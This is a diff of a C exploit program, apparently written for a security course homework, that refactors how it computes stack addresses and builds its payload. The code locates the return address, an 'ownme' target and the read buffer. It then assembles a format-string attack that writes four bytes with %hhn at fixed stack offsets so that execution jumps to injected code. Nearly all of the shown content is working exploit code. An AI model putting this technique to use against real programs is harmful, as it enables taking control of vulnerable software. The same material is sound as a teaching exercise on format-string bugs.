@@ -157,44 +157,36 @@ int main(int argc, char* argv[]) {
 
    fprintf(stderr, "mainloop ra: %x, mainloop bp: %x\n", cur_mainloop_ra, cur_mainloop_bp);
 
-   // Calculate main_loop ra location
+   // Calculate current address of ra, ownme, rdbuf, and code section of exploit buffer
    unsigned cur_mainloop_ra_loc = cur_mainloop_bp - mainloop_bp_ra_diff;
-   fprintf(stderr, "current ra location: %x\n", cur_mainloop_ra_loc);
-
-   // Actual ownme address
    unsigned cur_ownme_addr = cur_mainloop_ra - mainloop_ownme_diff;
-   fprintf(stderr, "current ownme addr: %x\n", cur_ownme_addr);
-
-   // Current rdbuff address
    unsigned cur_rdbuf_addr = cur_mainloop_bp - mainloop_bp_rdbuff_diff;
-   fprintf(stderr, "current rdbuff addr: %x\n", cur_rdbuf_addr);
-
-   // Address of injected code in exploit buffer
    unsigned code_addr = cur_rdbuf_addr + 256;
+
+   fprintf(stderr, "current ra location: %x\n", cur_mainloop_ra_loc);
+   fprintf(stderr, "current ownme addr: %x\n", cur_ownme_addr);
+   fprintf(stderr, "current rdbuff addr: %x\n", cur_rdbuf_addr);
    fprintf(stderr, "code addr: %x\n", code_addr);
 
-   // Initialize exploit buffer
-   // 128 bytes for each "section" (attack_format, params, injected code)
+   // Initialize exploit buffer (128 bytes for each of attack_format, params, injected code)
    unsigned explsz = 128 * 3;
    void** exploit = (void**)malloc(explsz);
    memset((void*)exploit, '\0', explsz);
 
-   // NOTE: Offset, in words, from printf's stack frame to the first byte in 
-   // rdbuf is 152 (determined using GDB + trial and error). This means that
-   // the offset to the "params" part of the exploit string is 152 + 128/4 = 184
+   // NOTE: Offset, in words, from printf's stack frame to first byte in rdbuf is 152
+   // (determined using GDB + trial and error). This means that 152 + 128/4 = 184 is the
+   // offset to the "params" part of the exploit string
    char attack_format[] =
-      "e "                             // start echo command
-      "%%184$%dd%%185$%dd%%186$hhn"   // write first byte to addr at offset 186
-      "%%187$%dd%%188$%dd%%189$hhn"    // write second byte to addr at offset 189
-      "%%190$%dd%%191$%dd%%192$hhn"    // write third byte to addr at offset 192
-      "%%193$%dd%%194$%dd%%195$hhn"    // write last byte to addr at offset 195
-      "\n"                             // end echo command
+      "e "                          // start echo command
+      "%%184$%dd%%185$%dd%%186$hhn" // write first byte to addr at offset 186
+      "%%187$%dd%%188$%dd%%189$hhn" // write second byte to addr at offset 189
+      "%%190$%dd%%191$%dd%%192$hhn" // write third byte to addr at offset 192
+      "%%193$%dd%%194$%dd%%195$hhn" // write last byte to addr at offset 195
+      "\n"                          // end echo command
    ;
 
-   // Set Ci/Bi as defined in the homework solution
-   unsigned printed = 0;
-   
-   unsigned c1 = 256;
+   // Compute Ci/Bi as defined in the homework solution
+   unsigned printed = 0, c1 = 256;
    unsigned b1 = convert_hex(code_addr);
    printed += c1 + b1;
    
